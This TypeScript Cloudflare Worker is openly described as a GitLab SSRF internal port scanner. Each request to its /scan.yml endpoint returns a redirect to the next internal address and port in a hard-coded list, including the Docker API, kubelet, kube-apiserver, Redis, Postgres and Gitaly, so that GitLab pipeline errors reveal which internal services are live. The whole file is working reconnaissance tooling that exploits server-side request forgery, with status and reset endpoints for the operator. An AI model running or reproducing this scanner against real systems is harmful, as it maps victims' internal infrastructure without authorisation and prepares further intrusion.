/**
 * GitLab SSRF — Internal Port Scanner (Redirect Cycling Worker)
 *
 * Each GET /scan.yml cycles a 302 redirect to the next internal target.
 * GitLab follows the redirect → pipeline error reveals if service responded.
 */

// ============================================================
// CONFIGURE TARGETS HERE
// ============================================================
const TARGETS: { ip: string; port: number; label: string }[] = [
  // GitLab microservices
  { ip: "198.18.0.1", port: 80, label: "workhorse-80" },
  { ip: "198.18.0.1", port: 443, label: "workhorse-443" },
  { ip: "198.18.0.1", port: 8080, label: "webservice-8080" },
  { ip: "198.18.0.1", port: 8181, label: "workhorse-8181" },
  { ip: "198.18.0.1", port: 3000, label: "rails-3000" },
  // Container / Package Registry
  { ip: "198.18.0.1", port: 5000, label: "container-registry" },
  { ip: "198.18.0.1", port: 5050, label: "registry-5050" },
  // Docker
  { ip: "198.18.0.1", port: 2375, label: "docker-api" },
  { ip: "198.18.0.1", port: 2376, label: "docker-tls" },
  // Monitoring
  { ip: "198.18.0.1", port: 9090, label: "prometheus" },
  { ip: "198.18.0.1", port: 9100, label: "node-exporter" },
  // GitLab internal services
  { ip: "198.18.0.1", port: 8075, label: "gitaly" },
  { ip: "198.18.0.1", port: 8150, label: "kas" },
  { ip: "198.18.0.1", port: 8090, label: "pages" },
  { ip: "198.18.0.1", port: 2222, label: "shell" },
  // Databases
  { ip: "198.18.0.1", port: 6379, label: "redis" },
  { ip: "198.18.0.1", port: 5432, label: "postgres" },
  { ip: "198.18.0.1", port: 9200, label: "elasticsearch" },
  // Service mesh
  { ip: "198.18.0.1", port: 15000, label: "envoy-admin" },
  { ip: "198.18.0.1", port: 15014, label: "istio-pilot" },
  // Adjacent IPs
  { ip: "198.18.0.2", port: 8080, label: "198.18.0.2-8080" },
  { ip: "198.18.0.3", port: 8080, label: "198.18.0.3-8080" },
  { ip: "198.19.0.1", port: 8080, label: "198.19.0.1-8080" },
  { ip: "198.19.0.1", port: 80, label: "198.19.0.1-80" },
  // Sidekiq / Mailroom
  { ip: "198.18.0.1", port: 8082, label: "sidekiq" },
  { ip: "198.18.0.1", port: 8083, label: "mailroom" },
  // Additional GCP services
  { ip: "198.18.0.1", port: 10250, label: "kubelet" },
  { ip: "198.18.0.1", port: 10255, label: "kubelet-readonly" },
  { ip: "198.18.0.1", port: 6443, label: "kube-apiserver" },
  { ip: "198.18.0.1", port: 8443, label: "kube-apiserver-alt" },
];

// ============================================================
// STATE (resets on cold start — acceptable for this use case)
// ============================================================
let current = 0;

// ============================================================
// HELPERS
// ============================================================
interface LogEntry {
  ts: string;
  event: string;
  target?: string;
  ip?: string;
  position?: number;
  ua?: string;
  cf?: {
    colo: string;
    country: string;
    asn: number;
  };
}

function ts(): string {
  return new Date().toISOString();
}

function redirectUrl(t: (typeof TARGETS)[number]): string {
  return `http://${t.ip}:${t.port}/api/v4/projects.yml`;
}

// ============================================================
// WORKER
// ============================================================
export default {
  async fetch(request: Request): Promise<Response> {
    const url = new URL(request.url);
    const path = url.pathname;
    const cf = (request as any).cf || {};
    const ua = request.headers.get("User-Agent") || "unknown";

    const log: LogEntry = {
      ts: ts(),
      event: "request",
      ua: ua.substring(0, 80),
      cf: {
        colo: cf.colo || "?",
        country: cf.country || "?",
        asn: cf.asn || 0,
      },
    };

    // ==========================================================
    // /scan.yml — cycle to next target
    // ==========================================================
    if (path === "/scan.yml") {
      const target = TARGETS[current];
      const dest = redirectUrl(target);
      const pos = current;
      current = (current + 1) % TARGETS.length;
      const next = TARGETS[current];

      console.log(
        JSON.stringify({
          ...log,
          event: "redirect",
          position: pos + 1,
          total: TARGETS.length,
          target: `${target.ip}:${target.port}`,
          label: target.label,
          destination: dest,
          next: `${next.ip}:${next.port} (${next.label})`,
        })
      );

      return Response.redirect(dest, 302);
    }

    // ==========================================================
    // /status — current position
    // ==========================================================
    if (path === "/status") {
      const next = TARGETS[current];
      console.log(JSON.stringify({ ...log, event: "status", position: current }));

      return new Response(
        JSON.stringify({
          current,
          total: TARGETS.length,
          next: `${next.ip}:${next.port} (${next.label})`,
          targets: TARGETS.map((t) => `${t.ip}:${t.port} ${t.label}`),
        }),
        { headers: { "Content-Type": "application/json" } }
      );
    }

    // ==========================================================
    // /reset — reset to position 0
    // ==========================================================
    if (path === "/reset") {
      const wasAt = current;
      current = 0;
      console.log(JSON.stringify({ ...log, event: "reset", wasAt, total: TARGETS.length }));

      return new Response(
        JSON.stringify({ status: "reset", wasAt, total: TARGETS.length }),
        { headers: { "Content-Type": "application/json" } }
      );
    }

    // ==========================================================
    // /targets — list all targets
    // ==========================================================
    if (path === "/targets") {
      console.log(JSON.stringify({ ...log, event: "targets" }));

      return new Response(
        JSON.stringify(
          TARGETS.map((t, i) => ({
            id: i + 1,
            ip: t.ip,
            port: t.port,
            label: t.label,
            url: redirectUrl(t),
          }))
        ),
        { headers: { "Content-Type": "application/json" } }
      );
    }

    // ==========================================================
    // / — health check
    // ==========================================================
    if (path === "/") {
      return new Response(
        JSON.stringify({
          status: "ok",
          targets: TARGETS.length,
          position: current,
          endpoints: ["/scan.yml", "/status", "/reset", "/targets"],
        }),
        { headers: { "Content-Type": "application/json" } }
      );
    }

    // ==========================================================
    // 404
    // ==========================================================
    console.log(JSON.stringify({ ...log, event: "404", path }));
    return new Response("Not Found", { status: 404 });
  },
};
